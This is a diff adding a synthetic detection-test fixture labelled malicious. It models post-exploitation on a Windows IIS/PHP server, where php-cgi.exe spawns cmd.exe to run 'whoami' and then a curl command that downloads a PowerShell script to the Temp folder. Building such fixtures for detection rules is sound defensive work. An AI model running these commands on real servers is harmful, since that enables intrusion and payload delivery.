@@ -1,0 +1,25 @@
+{
+  "label": "malicious",
+  "variant": "php-cgi.exe -> cmd whoami + curl",
+  "source": "synthetic (Windows IIS/PHP path; not a real PHP2Shell log)",
+  "expect_alert": true,
+  "result": "not run",
+  "synthetic": true,
+  "EventCode": 1,
+  "events": [
+    {
+      "ParentImage": "C:\\\\PHP\\\\php-cgi.exe",
+      "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+      "CommandLine": "cmd.exe /c whoami",
+      "User": "IIS APPPOOL\\\\DefaultAppPool",
+      "host": "iis1"
+    },
+    {
+      "ParentImage": "C:\\\\PHP\\\\php-cgi.exe",
+      "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+      "CommandLine": "cmd.exe /c curl http://127.0.0.1/x.ps1 -o C:\\\\Windows\\\\Temp\\\\x.ps1",
+      "User": "IIS APPPOOL\\\\DefaultAppPool",
+      "host": "iis1"
+    }
+  ]
+}
